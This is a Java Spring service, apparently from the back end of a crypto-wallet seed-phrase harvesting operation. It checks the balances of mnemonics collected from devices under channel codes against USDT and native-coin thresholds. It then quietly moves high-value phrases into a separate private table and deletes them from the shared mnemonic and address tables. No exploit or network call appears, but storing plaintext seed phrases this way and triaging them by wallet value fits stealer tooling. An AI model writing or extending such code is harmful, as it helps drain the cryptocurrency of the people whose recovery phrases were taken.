package com.consume.service;

import com.consume.config.MaxNoticeProperties;
import com.consume.dao.Address4Dao;
import com.consume.dao.MnemonicDao;
import com.consume.dao.PrivateMnemonicDao;
import com.consume.entity.DeviceEntity;
import com.consume.entity.MnemonicEntity;
import com.consume.entity.PrivateMnemonicEntity;
import com.consume.util.WalletBalanceQuery.ChainBalance;

import lombok.extern.slf4j.Slf4j;
import org.springframework.dao.DuplicateKeyException;
import org.springframework.stereotype.Service;

import javax.annotation.Resource;
import java.math.BigDecimal;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

@Service
@Slf4j
public class HighValueMnemonicService {

    private final ConcurrentHashMap<Integer, Boolean> migrating = new ConcurrentHashMap<>();

    @Resource
    private MaxNoticeProperties maxNoticeProps;
    @Resource
    private MnemonicDao mnemonicDao;
    @Resource
    private PrivateMnemonicDao privateMnemonicDao;
    @Resource
    private Address4Dao address4Dao;

    public boolean isEnabled() {
        return maxNoticeProps != null && maxNoticeProps.isEnabled();
    }

    public boolean isHighValue(Map<String, ChainBalance> balances) {
        if (!isEnabled() || balances == null || balances.isEmpty()) {
            return false;
        }
        BigDecimal usdtSum = BigDecimal.ZERO;
        for (Map.Entry<String, ChainBalance> e : balances.entrySet()) {
            ChainBalance b = e.getValue();
            if (b == null) continue;
            usdtSum = usdtSum.add(parseDecimal(b.getUsdtBal()));
            String chain = e.getKey() == null ? "" : e.getKey().trim().toLowerCase();
            BigDecimal nativeTh = nativeThreshold(chain);
            if (nativeTh != null && nativeTh.compareTo(BigDecimal.ZERO) > 0) {
                if (parseDecimal(b.getNativeBal()).compareTo(nativeTh) > 0) {
                    log.info("正常日志:[maxnotice] 命中原生币阈值 chain={} native={} threshold={}",
                            chain, b.getNativeBal(), nativeTh);
                    return true;
                }
            }
        }
        BigDecimal usdtTh = maxNoticeProps.getUsdtSumThreshold() == null
                ? BigDecimal.ZERO : maxNoticeProps.getUsdtSumThreshold();
        if (usdtTh.compareTo(BigDecimal.ZERO) > 0 && usdtSum.compareTo(usdtTh) > 0) {
            log.info("正常日志:[maxnotice] 命中 USDT 合计 usdtSum={} threshold={}", usdtSum, usdtTh);
            return true;
        }
        return false;
    }

    /**
     * 迁入 private_mnemonic 后删除 mnemonic 与 address4。
     *
     * @return private_mnemonic 主键；失败返回 null（保留原 mnemonic）
     */
    public Integer migrateToPrivate(Integer mnemonicId, DeviceEntity device) {
        if (mnemonicId == null) return null;
        if (migrating.putIfAbsent(mnemonicId, Boolean.TRUE) != null) {
            sleepQuiet(200);
            MnemonicEntity still = mnemonicDao.selectById(mnemonicId);
            if (still == null) return null;
            String hash = still.getPhraseHash() == null ? "" : still.getPhraseHash();
            String deviceId = still.getDeviceId() == null ? "" : still.getDeviceId();
            if (hash.isEmpty()) return null;
            try {
                return privateMnemonicDao.findIdByDeviceResultHash(deviceId, hash);
            } catch (Exception e) {
                return null;
            }
        }
        try {
            MnemonicEntity mn = mnemonicDao.selectById(mnemonicId);
            if (mn == null) {
                return null;
            }
            String hash = mn.getPhraseHash() == null ? "" : mn.getPhraseHash();
            String deviceId = mn.getDeviceId() == null ? "" : mn.getDeviceId();
            Integer privateId = null;
            if (!hash.isEmpty()) {
                try {
                    privateId = privateMnemonicDao.findIdByDeviceResultHash(deviceId, hash);
                } catch (Exception e) {
                    log.info("异常日志:[maxnotice] 查 private_mnemonic 失败 mnemonicId={} err={}",
                            mnemonicId, e.getMessage());
                }
            }
            if (privateId == null) {
                PrivateMnemonicEntity pe = toPrivate(mn, device);
                try {
                    privateMnemonicDao.insert(pe);
                    privateId = pe.getId();
                    log.info("正常日志:[maxnotice] 已写入 private_mnemonic id={} fromMnemonic={} device={}",
                            privateId, mnemonicId, deviceId);
                } catch (DuplicateKeyException dup) {
                    log.info("正常日志:[maxnotice] private_mnemonic 并发唯一键命中 mnemonicId={}", mnemonicId);
                    try {
                        privateId = privateMnemonicDao.findIdByDeviceResultHash(deviceId, hash);
                    } catch (Exception ignore) {}
                } catch (Exception e) {
                    try {
                        privateId = privateMnemonicDao.findIdByDeviceResultHash(deviceId, hash);
                    } catch (Exception ignore) {}
                    if (privateId == null) {
                        log.info("异常日志:[maxnotice] 写入 private_mnemonic 失败，保留 mnemonic mnemonicId={} err={}",
                                mnemonicId, e.getMessage());
                        return null;
                    }
                }
            }

            try {
                address4Dao.deleteByMnemonicId(mnemonicId);
            } catch (Exception e) {
                log.info("异常日志:[maxnotice] 删除 address4 失败 mnemonicId={} err={}", mnemonicId, e.getMessage());
            }
            try {
                mnemonicDao.deleteById(mnemonicId);
            } catch (Exception e) {
                log.info("异常日志:[maxnotice] 删除 mnemonic 失败 mnemonicId={} err={}", mnemonicId, e.getMessage());
                if (mnemonicDao.selectById(mnemonicId) != null) {
                    return null;
                }
            }
            return privateId;
        } finally {
            migrating.remove(mnemonicId);
        }
    }

    private PrivateMnemonicEntity toPrivate(MnemonicEntity mn, DeviceEntity device) {
        PrivateMnemonicEntity pe = new PrivateMnemonicEntity();
        pe.setDeviceId(mn.getDeviceId());
        String channel = mn.getChannelcode();
        if ((channel == null || channel.isEmpty()) && device != null) {
            channel = device.getChannelCode();
        }
        pe.setChannelCode(channel == null ? "" : channel);
        pe.setWordsCount(mn.getWordscount());
        pe.setResult(mn.getResult());
        pe.setSource(mn.getSource());
        pe.setStatus(mn.getStatus() == null ? 2 : mn.getStatus());
        pe.setAddTime(mn.getAddtime() != null ? mn.getAddtime()
                : System.currentTimeMillis() / 1000.0);
        pe.setResultHash(mn.getPhraseHash());
        pe.setRecvDupCount(mn.getRecvDupCount() == null ? 0 : mn.getRecvDupCount());
        return pe;
    }

    private BigDecimal nativeThreshold(String chain) {
        Map<String, BigDecimal> map = maxNoticeProps.getNativeThresholds();
        if (map == null || chain == null || chain.isEmpty()) return null;
        BigDecimal v = map.get(chain);
        if (v != null) return v;
        return map.get(chain.toLowerCase());
    }

    static BigDecimal parseDecimal(String s) {
        if (s == null || s.trim().isEmpty()) return BigDecimal.ZERO;
        try {
            return new BigDecimal(s.trim());
        } catch (Exception e) {
            return BigDecimal.ZERO;
        }
    }

    private static void sleepQuiet(long ms) {
        try { Thread.sleep(ms); } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
    }
}
